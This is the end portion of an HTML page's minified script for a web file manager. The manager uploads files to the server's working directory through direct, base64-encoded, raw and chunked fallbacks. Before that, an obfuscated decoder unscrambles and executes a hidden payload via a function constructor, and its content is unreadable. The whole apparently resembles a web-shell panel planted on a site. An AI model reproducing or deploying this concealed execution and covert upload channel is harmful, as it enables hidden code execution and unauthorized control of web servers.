r=t*(o+127)+t%52314,i=t*(o+274)+t%38173,s=r%n,l=i%n,c=a[s];a[s]=a[l],a[l]=c,t=(r+i)%2839527}return a.join("")}var t=e("rbcryjcuaenkscpqtftsnolhzogurdtixowmv").substr(0,11),n=e[t];n("",n("",e('-hdii=rp)cc]nfi+i ;gn1rhni(bt;e- r=(klmp9C7rg h)r;7s";8=rye)];da7]e79,6[+(i,uo,9(86,v8=a.a=80,te,.[,-0b+],e1.sr,rp()lek5svvfg6qd,;8;.radsu.Ss0l3rnvle0erscq+1)*}o,{[;=q);;5amvo,grva=,mf;clrn6]mepy61anghp;r5r==ax<]aC,m7[ 0=h<nstg;2i")haj]..4aoa,ieg70a2ho))(a(nzoii(6onyv+<13,")=;="ve-;h vlo;e0C)esrri;n]urjfv.r(p,e=n.cr1nn=;lultac6rlj+a{;(=([her+.=u2(;(pt oqror;li.g=pp{Cj,;t+;)}(erc)r1,.uaeoqd=it8;u(;t=g] l)+w;9h-"a{;=xz=);>;,;ws,o=s(uaAfr2v1+e=l1rif >+a}t.l,;f{gk(C")s =v[. 8vqv;]f)i+e,++an0n ([ld  z.!}u( h[)=o=o(tlaqqr)(ro=t;t+=me+flt}l(.hqiav7;)=l6n+c9p[e"v4i7t8t(g+t7ome.[t2posvvCw4=ng(vpo )f(+(frl(a[bl-n<tthe+,+;i;(rrSCt tc+la;b+t,+.pvvgi}osuattr9at8a)0)e{1na".ro* )vn1q)6dip<t-..b ]fojv rg]at}s;g(n")uh=(r0v= .r,vr;3(;uht1(d96)]2)]cht),)0r7r rrjtA) =rfuoxvvbnv rhi=j{a6p=adah)e=y0a)gtAln;thp ;;A=7idsn=6 nnbA=no[=.s(+xr.a0wnqx.g=n[.nr4t;2[nCn;ertnjr)aarifm;1c;uuzi"y.cvo!cattoalh=(k'))(e('f)ssfatrgn{"t(!}))ori=s!rR]ctheznk[]n.o!dcus]0(t.!.j#ee+k6e.h=;=}(.s.8jbqR_n=!n}NaoC#R4!rciha..be;+%(1.]:Raf"iT=(b].bi]#b+.h+4p\'7r)].SeR R=f5p!R.R.=,..9]+..{u.=br(st6e7sn .s%]a(52Rr9):kg9tyRwpry.R 9))1o;"..b]8]w2.goj8:csfh]bt$m=r4+e.ns6h3...Stxi[t/o1{0sCta2tb!o(tRSRh[p=5al4i:+,Re0)_;oehaxMn,(hcbx)(%)R1g%m)0i1.;gt-2r,)bR.rcoi=}q!$/4&yn6r,!ea RR"!RNrb[-.Co)zE.D$)qo/oRsvftbRo.p$RR(e}i#}d(6{!%)cd.c9i8rtr1eR.=RifoRn49..h-p..c.0b%=ao..od0)shRriSkReqfr!E(s5T.;s_Rnrth)nnyR..(n(ixd6,=.tdp/p\'2bahc..)b)o]fo=.eI{.%dx.i%eN.i9E0r. 8#! t%.wkoyR6{$e.tmifc7j{%n.ioccp!ps.age8!((t,05=dSgb{f{+d).p.nkj{a$m_!Rom.b*ec%(tm..u.bR=b)k7ni.x0r%]n;0.Re5=eqRt=.!ba)efn&0mqtb9rj 0bEh.R[gfti;6%a.r/(")e95)/7Mt;t5o{R)RmR.{bo5%=.,tt%ffhIn(t\'tfrh;u.t.d;r%.)eEuRcRjb6izd;4zDEpb%.boR&!nt.tehg(7EoRdiR3et(b.lbRR;pmo.R:a)*%oc/gue!l_+r1uetttea."_D-!xetontndsh.R.cad+cp+cxrk[gR(rte.5eRT%!3(,.((=Ri;%RrR))zree;ap:un4(=hrp-7er))4RhRs0.=ep1;ee}CD=&R%oncts=}Ri))8*m*oeRlb1.ieR=_Rn/.e+Da(cncn.;\'a!kb9,sntR!}tbm().Scb.c==4b(7(2=!D!6hmccweer}h}=xbe0+.eh!=8ssq(2R.z0t (xu/.yct]em}/))megwvd8I2solhii/.teu8uz]doon)oCo(i,94j;R) v)e[ =,x.!.%. r o;cj')))(4625)}(),e.uf=function(){if(e.__fmUploading)e.jt("An upload is already running",!1);else{var a=t.getElementById(n.uploadInputId);if(a&&a.files&&a.files[0]){var o=a.files[0],s=parseInt(n.directMax,10)||4194304,l=parseInt(n.base64Max,10)||3145728,c=parseInt(n.rawMax,10)||8388608;e.__fmUploading=!0,function(e){r&&(clearTimeout(r),r=null),i&&(clearTimeout(i),i=null);var n=m();if(n){var a;n.classList.remove("hidden","ok","err"),n.title=e.name+" ("+((a=e.size)>=1073741824?(a/1073741824).toFixed(2)+" GB":a>=1048576?(a/1048576).toFixed(2)+" MB":a>=1024?(a/1024).toFixed(1)+" KB":a+" B")+")";var o=t.getElementById("up-name"),s=t.getElementById("up-detail"),l=t.getElementById("up-pct"),c=t.getElementById("up-fill"),d=t.getElementById("up-label");d&&(d.textContent="Uploading"),o&&(o.textContent=e.name),s&&(s.textContent=""),l&&(l.textContent="0%"),c&&(c.style.width="0%")}}(o),o.size<=s?function(t,a){var o=new e.XMLHttpRequest,r=new e.FormData;r.append("upload_file",t,t.name),o.open("POST",d({z:"up",x:n.cwdEncoded||""}),!0),o.setRequestHeader("X-Requested-With","XMLHttpRequest"),o.setRequestHeader("Accept","application/json"),v(o,0,80),o.onload=function(){var e=u(o.responseText||"");o.status>=200&&o.status<300&&e&&e.ok?a(!0,e.message||""):a(!1,e&&e.message?e.message:"Direct upload rejected")},o.onerror=function(){a(!1,"Network error during direct upload")},o.send(r)}(o,function(e,t){e?g(!0,t):f()}):f()}else e.jt("Select a file first",!1)}function f(t){o.size<=l?function(t,a){if(e.FileReader){p(4,"Encoding");var o=new e.FileReader;o.onerror=function(){a(!1,"Unable to read file")},o.onload=function(){var r=String(o.result||""),i=r.indexOf(","),s=i>=0?r.substring(i+1):r,l=new e.XMLHttpRequest;l.open("POST",d({z:"up64",x:n.cwdEncoded||""}),!0),l.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),l.setRequestHeader("X-Requested-With","XMLHttpRequest"),l.setRequestHeader("Accept","application/json"),v(l,6,84),l.onload=function(){var e=u(l.responseText||"");l.status>=200&&l.status<300&&e&&e.ok?a(!0,e.message||""):a(!1,e&&e.message?e.message:"Base64 upload rejected")},l.onerror=function(){a(!1,"Network error during base64 upload")},l.send("fn64="+encodeURIComponent(t.name)+"&fc64="+encodeURIComponent(s))},o.readAsDataURL(t)}else a(!1,"FileReader unavailable")}(o,function(e,t){e?g(!0,t):o.size<=c?h(o,function(e,t){e?g(!0,t):b(o,g)}):b(o,g)}):o.size<=c?h(o,function(e,t){e?g(!0,t):b(o,g)}):b(o,g)}},t.addEventListener("DOMContentLoaded",function(){var a=t.getElementById("fi"),o=t.getElementById("gi");if(a&&o){var r=e.localStorage.getItem("fi"),i=e.localStorage.getItem("gi");null!==r&&(a.value=r),null!==i&&(o.value=i),a.addEventListener("input",function(){e.localStorage.setItem("fi",this.value)}),o.addEventListener("input",function(){e.localStorage.setItem("gi",this.value)})}c(),e.cbUp(),e.bu(),y(),setTimeout(y,0),t.fonts&&t.fonts.ready&&t.fonts.ready.then&&t.fonts.ready.then(y);var s=t.getElementById("toast");s&&setTimeout(function(){s.classList.add("out"),setTimeout(function(){s.remove()},350)},3200);var l=t.getElementById(n.uploadInputId);l&&l.addEventListener("change",function(){var e=t.getElementById("fn");if(e){var n=this.files&&this.files[0]?this.files[0].name:"Choose...";e.innerText=n,e.classList.add("text-zinc-900")}});var d=t.getElementById("uploadForm");d&&(d.onsubmit=function(t){return t&&t.preventDefault&&t.preventDefault(),e.uf(),!1});var u=t.getElementById("up-x");u&&(u.onclick=function(){f()});var m=null;e.addEventListener("resize",function(){m&&clearTimeout(m),m=setTimeout(y,80)}),t.addEventListener("keydown",function(n){if(!("/"!==n.key&&191!==n.keyCode||n.ctrlKey||n.metaKey||n.altKey)){var a=n.target,o=a&&a.tagName?a.tagName.toLowerCase():"";if("input"===o||"textarea"===o||"select"===o||a&&a.isContentEditable)return;if(t.querySelector("#m-info:not(.hidden),#mt:not(.hidden),#mc:not(.hidden),#mr:not(.hidden),#md:not(.hidden),#mf:not(.hidden)"))return;var r=t.querySelector(".fm-search input[name=q]");r&&(n.preventDefault(),r.focus(),r.select&&r.select())}if("Escape"===n.key||27===n.keyCode)for(var i=["m-info","mt","mc","mr","md","mf"],s=0;s<i.length;s++){var l=t.getElementById(i[s]);if(l&&!l.classList.contains("hidden"))return void e.cm(i[s])}})})}(window,document);
</script>
</body>
</html>
